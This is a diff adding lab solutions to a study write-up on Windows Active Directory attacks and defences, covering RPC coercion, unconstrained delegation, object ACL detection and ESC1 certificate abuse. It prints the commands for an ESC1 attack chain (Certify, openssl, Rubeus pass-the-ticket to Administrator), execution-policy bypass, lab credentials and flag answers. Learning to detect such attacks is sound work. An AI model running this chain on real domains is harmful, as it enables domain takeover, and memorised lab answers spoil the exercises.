@@ -861,7 +861,12 @@ message seen when running dementor.py?**
 
 - Windows does not offer native, granular visibility or control over specific RPC calls out-of-the-box.
 - **RPC Firewalls:** Implement third-party RPC firewalls to monitor, audit, and explicitly block dangerous RPC functions or specific **OPNUMs** associated with coercing.
+    
+    ![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2058.png)
+    
 - **Outbound Traffic Restriction:** Block Domain Controllers and core infrastructure servers from initiating **outbound connections on ports 139 and 445**, except to strictly required infrastructure (e.g., other DCs for replication). This prevents the required reverse connection from succeeding, regardless of the RPC vulnerability used.
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2059.png)
 
 #### Detection
 
@@ -875,7 +880,30 @@ message seen when running dementor.py?**
 > **Repeat the example shown in the section, and type DONE as the answer when you are finished**
 > 
 
-**Answer:**
+By default, Windows sets its PowerShell **Execution Policy** to Restricted, protecting the system from malicious code. To turn it off easily, I run this command:
+
+```bash
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+```
+
+And then run the script in the Downloads folder:
+
+```bash
+Import-Module .\PowerView-main.ps1
+Get-NetComputer -Unconstrained | select samaccountname
+```
+
+To identify systems configured for `Unconstrained Delegation`, we can use the `Get-NetComputer` function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) along with the `-Unconstrained` switch.
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2060.png)
+
+We will start `Rubeus` in an administrative prompt to monitor for new logons and extract TGTs.
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2061.png)
+
+Next, we need to know the IP address of WS001, which we can obtain by running `ipconfig`. Once known, we will switch to the Kali machine to execute `Coercer` towards DC1, while we force it to connect to WS001 if coercing is successful.
+
+**Answer: DONE**
 
 ### Object ACLs
 
@@ -909,20 +937,28 @@ message seen when running dementor.py?**
 #### Detection
 
 - Inspect **EventID 4738 (A user account was changed)** to monitor modifications to user objects, alerting when non-administrative accounts perform modifications or attempt unauthorized SPN additions.
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2062.png)
+
 - Inspect **EventID 4724 (An attempt was made to reset an account's password)** to catch unauthorized password resets executed through delegated ACL rights.
 - Inspect **EventID 4742 (A computer account was changed)** to detect modifications made directly to computer object attributes (such as RBCD configurations).
+    
+    ![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2063.png)
+    
 - **Baseline Account Behavior:** Correlate user modification events against designated administrative naming conventions or Privileged Access Workstations to identify anomalous modification sources.
 - Use **Honey pot**, follow these mindsets when setup:
     - Create a decoy account/object (e.g., assign high ACLs or grant broad modification permissions to multiple users) while simulating realistic user activity.
     - Ensure an automated system continuously monitors all interactions with the decoy object.
     - If unauthorized tampering is detected (**EventID 4738**), immediately disable the user account responsible for the modification (**EventID 4725**) and isolate the system for investigation.
+    
+    ![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2064.png)
 
 #### Labs
 
 > **Repeat the example in the section and type DONE as the answer when you are finished**
 > 
 
-**Answer:**
+**Answer: DONE**
 
 ### PKI - ESC1
 
@@ -968,9 +1004,95 @@ message seen when running dementor.py?**
 > **Connect to the Kali host first, then RDP to WS001 as 'bob:Slavi123' and practice the techniques shown in this section. What is the flag value located at \\dc1\c$\scripts?**
 > 
 
-**Answer:**
+Use [Certify](https://github.com/GhostPack/Certify) to scan the environment for vulnerabilities in the PKI infrastructure.
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2065.png)
+
+Scroll down to see **Vulnerable Certificate Templates.**
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2066.png)
+
+To abuse this template, we will use `Certify` and pass the argument `request` by specifying the full name of the CA, the name of the vulnerable template, and the name of the user.
+
+```bash
+.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
+```
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2067.png)
+
+We need to convert the **PEM** certificate to the [**PFX**](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files) format. Copy and paste the content of the two keys from the Windows machine (WS001) to the Kali machine.
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2068.png)
+
+To be on the safe side, let's first execute the below command to avoid bad formatting of the `PEM` file.
+
+```bash
+sed -i 's/\s\s\+/\n/g' cert.pem
+```
+
+Create the **cert.pfx** file by running the following command, and press Enter to skip the password prompt.
+
+```bash
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2069.png)
+
+Then, I opened a basic web server on my Kali machine.
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2070.png)
+
+And retrieved the file cert.pfx back to the Windows Desktop.
+
+```bash
+Invoke-WebRequest -Uri "http://[YOUR_IP]:8080/cert.pfx" -OutFile "cert.pfx"
+```
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2071.png)
+
+Now that we have the certificate in a usable `PFX` format (which `Rubeus` supports), we can request a Kerberos TGT for the account `Administrator` and authenticate with the certificate.
+
+```bash
+.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
+```
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2072.png)
+
+After successful authentication, we will be able to list the content of the `C$` share on DC1.
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2073.png)
+
+**Answer: Pk1_Vuln3r@b!litY**
 
 > **After performing the ESC1 attack, connect to PKI (172.16.18.15) as 'htb-student:HTB_@cademy_stdnt!' and look at the logs. On what date was the very first certificate requested and issued?**
 > 
 
-**Answer:**
+To answer this question, I need to complete the previous one first.
+
+From the current PowerShell window on the Windows machine (WS001), you need to create a new PowerShell session running under the **htb-student** user of the **eagle** domain using the **runas** command.
+
+```bash
+runas /user:eagle\htb-student powershell
+```
+
+Password: HTB_@cademy_stdnt!
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2074.png)
+
+In the newly opened PowerShell window, use the PowerShell Remoting feature to "jump" into the PKI server using the following command:
+
+```bash
+Enter-PSSession -ComputerName PKI
+```
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2075.png)
+
+Now that you are inside the PKI machine, search for Windows Security Event ID **4887** (which indicates that Certificate Services approved and issued a certificate). Sorting these events chronologically reveals the creation date of the earliest log entry.
+
+```bash
+Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4887'} | Select-Object -Property TimeCreated, Message | Sort-Object TimeCreated
+```
+
+![image.png](/assets/img/cdsa/sec6-windows-attacks-defense/image%2076.png)
+
+**Answer: 12-19-2022**
